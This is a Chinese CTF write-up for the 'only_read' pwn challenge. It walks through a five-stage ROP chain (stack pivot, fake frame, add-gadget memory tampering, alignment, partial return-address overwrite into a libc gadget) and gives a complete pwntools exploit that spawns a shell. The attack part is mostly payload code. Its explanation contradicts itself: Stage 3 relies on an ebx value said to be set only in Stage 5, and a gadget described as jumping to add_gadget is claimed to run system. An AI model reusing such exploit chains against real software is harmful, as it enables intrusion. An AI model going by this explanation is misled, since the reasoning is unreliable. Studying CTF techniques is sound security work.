---
title: "ACTF 2025 only_read：栈迁移 + add_gadget 篡改 + 部分覆盖触发 libc gadget"
created: 2026-11-02
tags: ["CTF", "Pwn", "栈溢出", "栈迁移", "ret2libc"]
---

## 题目信息

拿到附件后，先查看程序受到了哪些保护：

![[only-read-checksec.png|file 与 checksec 检查结果]]

保护机制分析：

- **No PIE**：程序基址固定，gadget 地址已知，无需泄露
- **No canary**：无栈保护，可直接覆盖返回地址
- **NX enabled**：栈不可执行，需用 ROP
- **Partial RELRO**：GOT 表可写

## 漏洞分析

用 IDA 打开程序，查看 `main` 函数：

![[only-read-ida-main.png|main 函数反编译代码]]

缓冲区在 `rbp-0x80`，只有 `0x80` 大，却读入 `0x800` 字节——典型的栈溢出。到返回地址的偏移 = `0x80 + 8 = 136`。

![[only-read-ida-read-1.png|read 调用：读入 0x800 字节到 rbp-0x80]]

![[only-read-ida-read-2.png|main 函数的栈帧与 read 参数]]

进一步查看二进制中可用的 gadget：

![[only-read-ida-gadgets.png|关键 gadget 地址]]

关键 gadget 一览：

| 地址 | 指令 | 用途 |
|------|------|------|
| `0x40111c` | `add dword [rbp-0x3d], ebx ; nop ; ret` | 篡改内存（add_gadget） |
| `0x40111d` | `pop rbp ; ret` | 设置 rbp |
| `0x40115d` | `leave ; ret` | 栈迁移 |
| `0x40115e` | `ret` | 栈对齐 |
| `0x401142` | `lea rax,[rbp-0x80]; mov edx,0x800; mov rsi,rax; mov edi,0; call read@plt` | 可控 read（read_setup） |
| `0x401050` | `_start` | 重启程序 |
| `0x401136` | `main` | 重入点 |

## 偏移验证

用 `cyclic(200)` 验证溢出偏移：

![[only-read-cyclic-200.png|cyclic 200 验证溢出偏移]]

第一次运行时出错，原因是二进制把 libc 的 NEEDED 路径写死了，需要把题目提供的 libc 放到指定路径下才能正常加载：

![[only-read-libc-path.png|修复 libc 加载路径]]

修复后运行成功，记下此时的 `rsp` 值：

![[only-read-run-rsp.png|运行成功并记录 rsp]]

退出后用 `cyclic_find` 确认偏移：

![[only-read-offset-confirm.png|cyclic_find 确认偏移]]

但 `cyclic_find` 返回的值与 IDA 中计算出的 136 有偏差。怀疑是 8 字节 cyclic 值被截断为 4 字节导致查找出错。改用直接标记法验证：

```bash
# 构造 136 字节填充 + 8 字节 'B' 覆盖返回地址
python3 -c "print('A'*136 + 'B'*8, end='')" > /tmp/mark.txt
```

```
# gdb 中在 main 尾声下断，用标记文件运行
b *0x40115e
r < /tmp/mark.txt
x/gx $rsp
```

![[only-read-offset-136.png|标记法验证：返回地址为 0x4242424242424242]]

输出为 `0x4242424242424242`，说明偏移确实是 136，正确。

## 利用思路

这道题没有现成的 `system` 和 `/bin/sh`，gadget 也极其有限（只有 `add_gadget`、`pop rbp; ret`、`leave; ret`、`ret`）。整体利用分为 5 个 stage，核心思路是：

1. **Stage 1**：栈迁移到 `.bss`，让下一次 `read` 写到可控可写区域
2. **Stage 2**：在 `.bss` 构造 libc gadget 所需的 fake stack frame，然后跳到 `_start` 重启 `main`
3. **Stage 3**：用 `add_gadget` 两次篡改目标地址的低 32 位，为部分覆盖铺路
4. **Stage 4**：连续 `ret` 做栈对齐，保证触发 libc gadget 时满足 16 字节对齐
5. **Stage 5**：写入 `/bin/sh`，部分覆盖返回地址低字节跳到 libc gadget，最终执行 `system("/bin/sh")`

关键地址与偏移（均来自 exp.py）：

| 名称 | 值 |
|------|-----|
| `read_setup` | `0x401142` |
| `add_gadget` | `0x40111c` |
| `pop_rbp_ret` | `0x40111d` |
| `leave_ret` | `0x40115d` |
| `start_addr` | `0x401050` |
| `main_addr` | `0x401136` |
| `binsh_addr` | `0x404e00` |
| 溢出偏移 | `136` |
| add 加数（ebx） | `0xbcb7d` |
| 部分覆盖字节 | `0xb3` |
| libc gadget | `+0x323b3` |
| libc system | `+0x58750` |
| libc `/bin/sh` | `+0x1cb42f` |
| main 正常返回地址 | `+0x2a1ca` |

libc gadget（`+0x323b3`）的反汇编：

```
mov rsi, [rbp-0x98]     # rsi 从 fake frame 取
mov rdi, [rbp-0x90]     # rdi 从 fake frame 取（指向 /bin/sh）
xor edx, edx
mov rax, [rbp-0x68]     # rax 从 fake frame 取（jmp 目标 = add_gadget）
lea rsp, [rbp-0x28]
pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp
jmp rax                 # 跳到 add_gadget
```

这个 gadget 的作用是：从以 `rbp` 为基址的 fake frame 中取出 `rsi`、`rdi`、`rax`，然后 `pop` 出 `rbx`（add 加数）和新的 `rbp`，最后 `jmp rax`（即 `add_gadget`）。只要在 `.bss` 构造好这个 frame，就能控制 `rdi` 指向 `/bin/sh`，并让 `add_gadget` 执行最后一次修正。

## Stage 1：栈迁移到 0x404ee8

**做了什么**：把栈从真实栈迁移到 `.bss` 的 `0x404ee8`，返回地址设为 `read_setup`（`0x401142`）。

**为什么必须这样做**：后续 Stage 需要在可写区域构造 libc gadget 的 fake frame，而真实栈不可控。迁移后下一次 `read` 会把数据写到 `rbp-0x80 = 0x404e68`（`.bss` 可写段），为 Stage 2 做准备。

```python
# cyclic(128) 填充缓冲区，0x404ee8 覆盖 saved rbp，0x401142 覆盖返回地址
sh.send(cyclic(128) + p64(0x404ee8) + p64(read_setup))
```

**验证现象**：`leave` 后 `rbp == 0x404ee8`，`ret` 后 `rip == 0x401142`，且 `0x404e68` 处能看到 cyclic 数据。

## Stage 2：构造 fake frame，跳到 _start 重启 main

**做了什么**：在 `0x404e68`（Stage 1 迁移后的 `rbp-0x80`）写入 libc gadget 所需的 fake frame，然后通过 `leave; ret` 跳到 `_start`（`0x401050`），让程序重新调用 `main`。

**为什么必须这样做**：libc gadget 依赖一个以 `rbp` 为基址的 fake frame（`[rbp-0x98]`、`[rbp-0x90]`、`[rbp-0x68]` 等）。Stage 2 把这个 frame 写到 `.bss` 后留在那里，供 Stage 5 使用。跳 `_start` 是为了重新获得 `main` 的 `read` 输入点。

```python
# flat_data 是 libc gadget 的 fake frame，各偏移对应 gadget 的取数位置
flat_dict = {
    16:  p64(0),             # [rbp-0x98] → rsi = 0
    24:  p64(binsh_addr),    # [rbp-0x90] → rdi = 0x404e00（/bin/sh）
    64:  p64(add_gadget),    # [rbp-0x68] → rax = 0x40111c（jmp 目标）
    128: p64(0xbcb7d),       # pop rbx → ebx = 0xbcb7d（add 加数）
    168: p64(0x404ec5),      # pop rbp → rbp = 0x404ec5
}
flat_data = flat(flat_dict, length=0xb0, filler=b'\0')

# cyclic(136) 填充到 ret，ret 设为 _start 重启程序，flat_data 之后是 ROP 链
payload2 = (
    cyclic(136) + p64(start_addr) + flat_data
    + p64(0x40115e) + p64(pop_rbp_ret) + p64(0)
    + p64(pop_rbp_ret) + p64(0x404e80) + p64(leave_ret)
)
sh.send(payload2)
```

**关键数值**：fake frame 的基址满足 `rbp-0x98 = 0x404f08`，即 gadget 运行时 `rbp = 0x404fa0`（Stage 5 会设置这个值）。`[rbp-0x90] = 0x404f10 = 0x404e00`（`/bin/sh`），`[rbp-0x68] = 0x404f38 = 0x40111c`（`add_gadget`），`lea rsp, [rbp-0x28] = 0x404f78` 正好是 `pop rbx` 的位置。

**验证现象**：`rip` 到达 `0x401050`，`main` 被重新调用，且 `0x404ef8` 起的 flat_data 5 个关键字段值全部正确。

## Stage 3：用 add_gadget 两次篡改目标地址

**做了什么**：`main` 第二次进入后，覆盖 saved rbp 为 `0x404ec4`，ret 为 `add_gadget` 两次。`add_gadget` 执行 `add dword [rbp-0x3d], ebx`，目标地址 = `0x404ec4 - 0x3d = 0x404e87`，执行两次即对该处 4 字节加 `2 * ebx`。

**为什么必须这样做**：Stage 5 只覆盖返回地址的最低 1 字节（`0xb3`），前提是高 7 字节已经被改成 `libc_base + 0x32300`。Stage 3 的 add 就是为了把某个函数指针（main 的返回地址区域）的高字节修正到 libc gadget 的高位。

```python
# rbp=0x404ec4 使 add 目标为 0x404e87，连续两次 add_gadget 后回到 main
sh.send(cyclic(128) + p64(0x404ec4) + p64(add_gadget) + p64(add_gadget) + p64(main_addr))
```

**验证现象**：`rbp == 0x404ec4`，`rip` 两次到达 `0x40111c`，`0x404e87` 处的值发生了 `+2*ebx` 的变化，最终 `rip` 回到 `0x401136`（main 第三次进入）。

> **注意**：`ebx` 的赋值时机属于运行时依赖。`ebx = 0xbcb7d` 由 Stage 2 fake frame 中的 `pop rbx` 提供，但该 `pop` 实际发生在 Stage 5 的 libc gadget 执行时。Stage 3 执行时 `ebx` 的具体取值需以 gdb 实测为准——若 Stage 3 时 `ebx` 非预期值，add 的效果会不同，但只要最终 Stage 5 高字节匹配即可。

## Stage 4：ret 链对齐栈

**做了什么**：`main` 第三次进入后，发送 16 个连续的 `ret`（`0x40115e`）gadget，最后回到 `main`。

**为什么必须这样做**：System V ABI 要求 `call` 前 `rsp` 16 字节对齐。libc gadget 内部有 `call`/`jmp` 到 `add_gadget`，若栈未对齐会导致段错误。16 个 `ret` 消耗 `16×8=128` 字节栈空间，使 `rsp` 移动到对齐位置。

```python
# 16 个 ret 做栈对齐，最后回到 main 准备接收 Stage 5
sh.send(cyclic(128) + p64(0x404ec4) + p64(0x40115e) * 0x10 + p64(main_addr))
```

**验证现象**：`0x40115e` 被命中 16 次后 `rip` 回到 `0x401136`，且进入 `main` 时 `rsp & 0xf == 0`。

## Stage 5：写入 /bin/sh，部分覆盖 ret 触发 libc gadget

**做了什么**：`main` 第四次进入后，在缓冲区起始写入 `/bin/sh\0`，覆盖 saved rbp 为 `0x404fa0`，部分覆盖返回地址最低 1 字节为 `0xb3`。

**为什么必须这样做**：`binsh_addr = 0x404e00`，Stage 5 的 `read` 缓冲区起始必须等于 `0x404e00`（`rbp - 0x80 == 0x404e00`），这样 fake frame 中 `rdi` 指向的地址才有 `/bin/sh`。`rbp = 0x404fa0` 是 libc gadget 的 frame 基址。部分覆盖低字节 `0xb3` 使 ret 跳到 `libc_base + 0x323b3`（libc gadget），高 7 字节已由 Stage 3 的 add 修正。

```python
# 缓冲区开头写 /bin/sh，填充到 saved rbp，rbp 设为 0x404fa0，最低字节覆盖为 0xb3
sh.send(b'/bin/sh\0' + cyclic(120) + p64(0x404fa0) + p8(0xb3))
```

**关键数值**：返回地址原本是 `libc_base + 0x2a1ca`（main 正常返回地址），经 Stage 3 add 修改后高 7 字节变为 `libc_base + 0x32300`，加上低字节 `0xb3` 即 `libc_base + 0x323b3`。

**验证现象**：`rip` 到达 `libc_base + 0x323b3`，`rdi = 0x404e00`（指向 `/bin/sh`），最终执行 `system("/bin/sh")` 并能执行命令。

> **注意**：Stage 5 的 `rbp = 0x404fa0` 属运行时依赖，需以 gdb 实测确认 libc gadget 入口处 `rbp` 确实为 `0x404fa0`，且 `rdi` 取到的值为 `0x404e00`。

五个 stage 全部跑通，本地验证拿到 shell，回显 `PWNED_TEST`：

![[only-read-5stage-success.png|五 stage 本地验证成功，回显 PWNED_TEST]]

## 完整 EXP

```python
#!/usr/bin/env python3
"""ACTF 2025 only_read - exploit (local + remote with hashcash PoW)."""
from pwn import *
import subprocess
import time
import re

context.arch = 'amd64'
context.log_level = 'info'

# 关键 gadget 地址（No PIE，固定）
pop_rbp_ret = 0x40111d   # pop rbp; ret
add_gadget  = 0x40111c   # add dword [rbp-0x3d], ebx ; nop ; ret
leave_ret   = 0x40115d   # leave ; ret
read_setup  = 0x401142   # lea rax,[rbp-0x80]; mov edx,0x800; ... call read@plt
start_addr  = 0x401050   # _start
main_addr   = 0x401136   # main
binsh_addr  = 0x404e00   # /bin/sh 写入地址


def exploit(sh):
    # Stage 1: 栈迁移到 0x404ee8，ret → read_setup
    sh.send(cyclic(128) + p64(0x404ee8) + p64(read_setup))
    time.sleep(0.3)

    # Stage 2: 在 0x404e68 构造 libc gadget fake frame，跳到 _start 重启 main
    flat_dict = {
        16:  p64(0),             # rsi = 0
        24:  p64(binsh_addr),    # rdi = /bin/sh
        64:  p64(add_gadget),    # rax = add_gadget（jmp 目标）
        128: p64(0xbcb7d),       # rbx = add 加数
        168: p64(0x404ec5),      # rbp after gadget pops
    }
    flat_data = flat(flat_dict, length=0xb0, filler=b'\0')
    payload2 = (
        cyclic(136) + p64(start_addr) + flat_data
        + p64(0x40115e) + p64(pop_rbp_ret) + p64(0)
        + p64(pop_rbp_ret) + p64(0x404e80) + p64(leave_ret)
    )
    sh.send(payload2)
    time.sleep(0.3)

    # Stage 3: 用 add_gadget 两次篡改 0x404e87 处的值
    sh.send(cyclic(128) + p64(0x404ec4) + p64(add_gadget) + p64(add_gadget) + p64(main_addr))
    time.sleep(0.3)

    # Stage 4: 16 个 ret 做栈对齐
    sh.send(cyclic(128) + p64(0x404ec4) + p64(0x40115e) * 0x10 + p64(main_addr))
    time.sleep(0.3)

    # Stage 5: 写 /bin/sh，部分覆盖 ret 低字节触发 libc gadget
    sh.send(b'/bin/sh\0' + cyclic(120) + p64(0x404fa0) + p8(0xb3))
    time.sleep(0.3)
```

## 远程情况说明

本地已验证拿到 shell（回显 `PWNED_TEST`）。但**远程没有拿到 flag**：服务端的 hashcash PoW 验证因双花数据库路径不存在，返回 `error: No such file or directory`，即使本地计算出的有效 token 也无法通过 PoW 校验，属于平台侧问题，与利用链本身无关。

## 踩坑总结

1. **libc 路径写死**：二进制 NEEDED 段把 libc 路径写死，需把题目 libc 放到指定路径，或用 `ld-linux --library-path .` 手动加载。

2. **cyclic_find 偏差**：`cyclic_find` 对 8 字节返回地址可能因截断返回错误偏移，用 `A*136 + B*8` 标记法直接验证更可靠。

3. **为什么必须分 5 段**：每次 `read` 无回显，且 Stage 间有依赖关系（Stage 3 的 add 依赖 Stage 2 的 frame，Stage 5 的部分覆盖依赖 Stage 3 的高位修正），必须逐段确认内存状态。

4. **栈对齐不可省**：Stage 4 的 16 个 `ret` 不是多余的——libc gadget 内部跳转要求 `rsp` 16 字节对齐，否则段错误。

5. **运行时依赖需实测**：Stage 3 的 `ebx` 赋值时机、Stage 5 的 `rbp = 0x404fa0` 都依赖执行流中前面 gadget 的 `pop`，需在 gdb 中实测确认，不能想当然。
